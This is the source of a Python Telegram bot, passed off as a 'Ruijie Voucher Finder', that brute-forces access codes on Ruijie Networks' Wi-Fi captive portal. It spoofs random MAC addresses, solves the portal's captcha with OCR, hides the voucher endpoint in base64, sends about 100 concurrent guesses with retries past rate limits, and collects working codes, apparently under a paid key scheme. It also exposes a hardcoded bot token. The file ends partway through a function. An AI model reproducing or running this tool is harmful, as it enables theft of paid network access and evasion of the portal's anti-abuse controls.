# -*- coding: utf-8 -*-
"""
VORTE XA — Ruijie Voucher Finder Bot
GitHub REMOVED | Key System OPTIONAL
"""
import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiohttp import web
import cv2, ddddocr, numpy as np
from datetime import datetime, timedelta, timezone
from collections import defaultdict, deque

# ════════════════════════════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════════════════════════════
BOT_TOKEN = "8648844261:AAGohP2qqSsDzcVTM42V9adhb08hLvsCZbM"
ADMIN_ID = 8635066797
ADMIN_IDS = (8635066797,)

# 🔥 Key System သုံးချင်ရင် True ထား၊ မသုံးချင်ရင် False ထား
USE_KEY_SYSTEM = False  # False = Key-Free, True = Key Required

# ════════════════════════════════════════════════════════════════
#  LOCAL PERSISTENCE (No GitHub)
# ════════════════════════════════════════════════════════════════
AUTH_FILE = "auth_list.json"
STATE_FILE = "state.json"
HITS_FILE = "hits.json"

def load_auth():
    try:
        with open(AUTH_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_auth(data):
    with open(AUTH_FILE, "w") as f:
        json.dump(data, f, indent=2)

# ════════════════════════════════════════════════════════════════
#  KEY HELPERS (if USE_KEY_SYSTEM = True)
# ════════════════════════════════════════════════════════════════
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
            second=0, tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

# ════════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ════════════════════════════════════════════════════════════════
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
retry_counts = {}
captcha_state = {}

session = None
_connector = None
CONCURRENCY = 100
_voucher_sem = None
_start_time = time.monotonic()
_ocr = ddddocr.DdddOcr(show_ad=False)

# ════════════════════════════════════════════════════════════════
#  WEB SERVER
# ════════════════════════════════════════════════════════════════
_web_start = time.time()

async def _ping_handler(request):
    up = int(time.time() - _web_start)
    h, r = divmod(up, 3600)
    m, s = divmod(r, 60)
    return web.json_response({
        "status": "ok",
        "bot": "VORTE XA",
        "uptime": f"{h}h {m}m {s}s"
    })

async def web_server():
    app = web.Application()
    app.router.add_get("/", _ping_handler)
    app.router.add_get("/ping", _ping_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 5000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"🌐 Web server on port {port}")

# ════════════════════════════════════════════════════════════════
#  STATE PERSISTENCE
# ════════════════════════════════════════════════════════════════
def save_state():
    try:
        payload = {
            "user_data": {str(k): v for k, v in user_data.items()},
            "approve": {str(k): v for k, v in approve.items()},
        }
        with open(STATE_FILE, "w") as f:
            json.dump(payload, f)
    except Exception as e:
        print(f"[save_state] error: {e}")

def load_state():
    global user_data, approve
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE) as f:
            payload = json.load(f)
        for k, v in payload.get("user_data", {}).items():
            user_data[int(k)] = v
        for k, v in payload.get("approve", {}).items():
            approve[int(k)] = v
        print(f"[startup] Loaded state for {len(user_data)} user(s)")
    except Exception as e:
        print(f"[load_state] error: {e}")

def save_hits():
    try:
        with open(HITS_FILE, "w") as f:
            json.dump({str(k): v for k, v in success_texts.items()}, f, indent=2)
    except Exception as e:
        print(f"[save_hits] error: {e}")

def load_hits():
    try:
        if not os.path.exists(HITS_FILE):
            return
        with open(HITS_FILE) as f:
            payload = json.load(f)
        for k, v in payload.items():
            try:
                cid = int(k)
            except ValueError:
                continue
            success_texts[cid] = v
        print(f"[startup] Loaded {sum(len(v) for v in success_texts.values())} local hits")
    except Exception as e:
        print(f"[load_hits] error: {e}")

# ════════════════════════════════════════════════════════════════
#  UI HELPERS
# ════════════════════════════════════════════════════════════════
def _main_keyboard():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False, row_width=2)
    kb.add(KeyboardButton("🖥 Dashboard"), KeyboardButton("🚀 Start Scan"))
    kb.add(KeyboardButton("🛑 Stop"), KeyboardButton("📋 Hits"))
    kb.add(KeyboardButton("📊 Status"), KeyboardButton("🆘 Help"))
    return kb

def _inline_dashboard(chat_id, action_note=""):
    session_url = user_data.get(chat_id, {}).get("session_url")
    hits = len(success_texts.get(chat_id, []))
    limited = len(limited_texts.get(chat_id, []))
    url_display = ("<i>မသိမ်းရသေးပါ — URL ပို့ပါ</i>"
                   if not session_url
                   else f"<code>{session_url[:72]}{'…' if len(session_url) > 72 else ''}</code>")
    key_status = "✅ Key-Free" if not USE_KEY_SYSTEM else "🔑 Key Required"

    text = (
        "╔═══════════════════════════╗\n"
        "║      🌐 <b>VORTE XA</b>      ║\n"
        "╠═══════════════════════════╣\n"
        "║     🖥 Dashboard      ║\n"
        "╚═══════════════════════════╝\n\n"
        f"{'🟢 ' + action_note if action_note else '📡'} <b>Live Panel</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Session: {url_display}\n"
        f"💎 Hits: <b>{hits}</b>    ⚠️ Limited: <b>{limited}</b>\n"
        f"🔐 Auth: {key_status}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 <i>အောက်က ခလုတ်လေးတွေကို နှိပ်ကြည့်ပါ 👇</i>"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⚡ Start Scan", callback_data="dash_start"),
        InlineKeyboardButton("🛑 Stop", callback_data="dash_stop"),
    )
    markup.add(
        InlineKeyboardButton("🔄 Refresh", callback_data="dash_refresh"),
        InlineKeyboardButton("📋 Hits", callback_data="dash_hits"),
    )
    markup.add(
        InlineKeyboardButton("🆘 Help", callback_data="dash_help"),
        InlineKeyboardButton("📊 Status", callback_data="dash_status"),
    )
    return text, markup

async def send_dashboard(chat_id, action_note="", force_send=False):
    text, markup = _inline_dashboard(chat_id, action_note=action_note)
    try:
        await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
    except:
        pass

# ════════════════════════════════════════════════════════════════
#  KEY FUNCTIONS
# ════════════════════════════════════════════════════════════════
def is_approved(chat_id):
    if not USE_KEY_SYSTEM:
        return True
    return approve.get(chat_id, False)

async def verify_key(chat_id):
    if not USE_KEY_SYSTEM:
        approve[chat_id] = True
        save_state()
        return True
    auth_list = load_auth()
    key = str(chat_id)
    if key in auth_list:
        if check_key_expiration(auth_list[key]):
            approve[chat_id] = True
            user_data.setdefault(chat_id, {})
            save_state()
            return True
        else:
            approve[chat_id] = False
            save_state()
            return False
    return False

# ════════════════════════════════════════════════════════════════
#  PORTAL HELPERS
# ════════════════════════════════════════════════════════════════
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

async def get_session_id(sess, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

# ════════════════════════════════════════════════════════════════
#  CAPTCHA
# ════════════════════════════════════════════════════════════════
def _ocr_sync(img_bytes):
    try:
        arr = np.frombuffer(img_bytes, np.uint8)
        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thr = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode(".png", thr)
        return _ocr.classification(buf.tobytes()).upper()
    except:
        return None

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(sess, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

# ════════════════════════════════════════════════════════════════
#  CODE HELPERS
# ════════════════════════════════════════════════════════════════
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def all_generator(length=6):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        hours = int(total_minutes) // 60
        minutes = int(total_minutes) % 60
        if hours > 0 and minutes > 0:
            return f"{hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{minutes}m"
    except:
        return 'Unknown'

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=15)
        ) as fresh_session:
            async with fresh_session.get(
                f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
                headers=headers
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Found : {found}\n"
            f"🔁Retry : {retries}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Found : {found}\n"
        f"🔁Retry : {retries}\n"
        f"📊Status : running\n"
    )

# ════════════════════════════════════════════════════════════════
#  PERFORM CHECK
# ════════════════════════════════════════════════════════════════
VOUCHER_URL = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

BATCH_SIZE = 500

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    response = None
    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[captcha] {e}")
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(VOUCHER_URL, json=data, headers=headers) as req:
                    response = await req.text()
                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:80]}")
            except Exception as e:
                print(f"[perform_check] {e}")
                return

        if response and 'request limited' in response:
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            await asyncio.sleep(1)
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(success_texts[chat_id])
        
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}")
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id], text=f"✅ Success Codes:\n\n{code_line}")
                    except:
                        sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}")
                        success_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"[success_msg] {e}")
        save_hits()

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id], text=f"⚠️ Limited Codes:\n\n{limited_line}")
                    except:
                        sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n\n{limited_line}")
                        limited_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"[limited_msg] {e}")

# ════════════════════════════════════════════════════════════════
#  BRUTEFORCE ENGINE
# ════════════════════════════════════════════════════════════════
async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            text = format_progress(checked, total, speed, found, retries)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            finish_text = (
                f"✅ Scan Completed!\n\n"
                f"📦 Checked : {checked:,}\n"
                f"💎 Found : {final_found}\n"
                f"📊 Progress : 100%\n"
                f"[████████████████████]"
            )
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                await bot.send_message(chat_id, finish_text)
    finally:
        scan_tasks.pop(chat_id, None)

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>")
        return

    mode = args[1]
    chat_id = message.chat.id

    if not is_approved(chat_id):
        if USE_KEY_SYSTEM:
            await bot.reply_to(message, "🔑 /key ဖြင့် အတည်ပြုပါ")
        else:
            approve[chat_id] = True
            save_state()
        return

    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "/input ဖြင့် Session URL ထည့်ပါ")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ Scan လုပ်နေပြီ — /stop နှိပ်ပါ")
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning Codes...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

# ════════════════════════════════════════════════════════════════
#  BOT HANDLERS
# ════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    welcome = (
        "╔═══════════════════════════╗\n"
        "║   🌐 <b>VORTE XA</b>      ║\n"
        "╠═══════════════════════════╣\n"
        "║  🇲🇲 Ruijie Voucher Finder ║\n"
        "╚═══════════════════════════╝\n\n"
        "👋 ကြိုဆိုပါတယ်!\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔐 Auth: {'Key-Free ✅' if not USE_KEY_SYSTEM else 'Key Required 🔑'}\n"
        "⚡ Captcha — အလိုအလျောက် ဖြေပေးပါတယ်\n\n"
        "💡 <b>အသုံးပြုနည်း:</b>\n"
        "1️⃣ Session URL ကို တိုက်ရိုက်ပို့ပါ\n"
        "2️⃣ /scan 6 — Scan စတင်ပါ\n"
        "3️⃣ /stop — Scan ရပ်ရန်\n"
        "4️⃣ /saved — ရှာတွေ့ထားသော Codes"
    )
    await bot.send_message(message.chat.id, welcome, parse_mode="HTML", reply_markup=_main_keyboard())

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command Guide**\n\n"
        "/start - Main menu\n"
        "/scan <mode> - Start scanning\n"
        "   /scan 6 → 6 digit codes\n"
        "   /scan 7 → 7 digit codes\n"
        "   /scan 8 → 8 digit codes\n"
        "   /scan all → a-z+0-9\n"
        "   /scan ascii-lower → a-z\n"
        "/input [url] - Set Session URL\n"
        "/stop - Stop scan\n"
        "/saved - Show found codes\n"
        "/recheck - Recheck codes\n"
        "/status - Bot status (Admin)"
    )
    await bot.send_message(message.chat.id, help_text, parse_mode="Markdown", reply_markup=_main_keyboard())

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
        return

    url = args[1]
    chat_id = message.chat.id

    if not is_approved(chat_id):
        if USE_KEY_SYSTEM:
            await bot.reply_to(message, "🔑 /key ဖြင့် အတည်ပြုပါ")
        else:
            approve[chat_id] = True
            save_state()
        return

    await bot.reply_to(message, "🔄 Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        user_data.setdefault(chat_id, {})
        user_data[chat_id]['session_url'] = url
        success_texts.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        save_state()
        await bot.send_message(
            message.chat.id,
            "✅ Session URL သိမ်းဆည်းပြီးပါပြီ\n\n"
            "💡 /scan 6 ဖြင့် စတင်ပါ",
            reply_markup=_main_keyboard()
        )
    else:
        await bot.send_message(message.chat.id, "❌ Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scan ရပ်တန့်ပြီးပါပြီ")
    else:
        await bot.reply_to(message, "⚪ ရပ်ရန် scan မရှိပါ")

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "📭 ရှာတွေ့ထားသော code မရှိသေးပါ")
        return

    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        parts.extend(success[:20])
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited[:20])

    await bot.send_message(chat_id, "\n\n".join(parts), parse_mode="Markdown")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "/input ဖြင့် Session URL ထည့်ပါ")
        return

    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ")
        return

    await bot.reply_to(message, "🔄 Rechecking...")
    new_success = []
    for item in success:
        code = item.split("🎫 ")[1].split("\n")[0] if "🎫 " in item else item
        recode = await perform_check(
            user_data[chat_id]['session_url'],
            code,
            chat_id,
            recheck=True,
            message=message
        )
        if recode:
            new_success.append(item)

    if new_success:
        success_texts[chat_id] = new_success
        save_hits()
        await bot.reply_to(message, f"✅ {len(new_success)} codes still valid")
    else:
        success_texts[chat_id] = []
        save_hits()
        await bot.reply_to(message, "No valid codes found")

# ════════════════════════════════════════════════════════════════
#  KEY SYSTEM COMMANDS (Only if USE_KEY_SYSTEM = True)
# ════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['key'])
async def handle_key(message):
    chat_id = message.chat.id
    if await verify_key(chat_id):
        await bot.reply_to(message, "✅ Key verified!")
    else:
        await bot.reply_to(message, "❌ Invalid or expired key")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != str(ADMIN_ID):
        await bot.reply_to(message, "No Permission")
        return
    if not USE_KEY_SYSTEM:
        await bot.reply_to(message, "⚠️ Key System is disabled")
        return

    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
        return

    plan = args[1]
    user_id = args[2]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Invalid plan. Use: 30m, 1h, 1d, 7d, 1m, 1y, unlimited")
        return

    auth_list = load_auth()
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    save_auth(auth_list)
    await bot.reply_to(
        message,
        f"✅ Key Generated\n\n"
        f"USER ID : {user_id}\n"
        f"PLAN : {plan}\n"
        f"EXPIRES : {expiry}"
    )

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != str(ADMIN_ID):
        await bot.reply_to(message, "No Permission")
        return
    if not USE_KEY_SYSTEM:
        await bot.reply_to(message, "⚠️ Key System is disabled")
        return

    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/delkey 123456789")
        return

    user_id = args[1]
    auth_list = load_auth()
    if user_id not in auth_list:
        await bot.reply_to(message, f"User {user_id} not found")
        return

    del auth_list[user_id]
    save_auth(auth_list)
    approve.pop(int(user_id), None)
    user_data.pop(int(user_id), None)
    await bot.reply_to(message, f"✅ Key deleted for user {user_id}")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != str(ADMIN_ID):
        await bot.reply_to(message, "No Permission")
        return
    if not USE_KEY_SYSTEM:
        await bot.reply_to(message, "⚠️ Key System is disabled")
        return

    auth_list = load_auth()
    if not auth_list:
        await bot.reply_to(message, "No keys registered")
        return

    lines = []
    for uid, data in auth_list.items():
        if isinstance(data, dict):
            expires = data.get("expires_at", "unknown")
            plan = data.get("plan", "unknown")
            if expires == "9999-12-31T23:59:59Z":
                expires_str = "Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        expires_str = "Expired"
                    else:
                        diff = exp_dt - now
                        days = diff.days
                        hours, rem = divmod(diff.seconds, 3600)
                        minutes = rem // 60
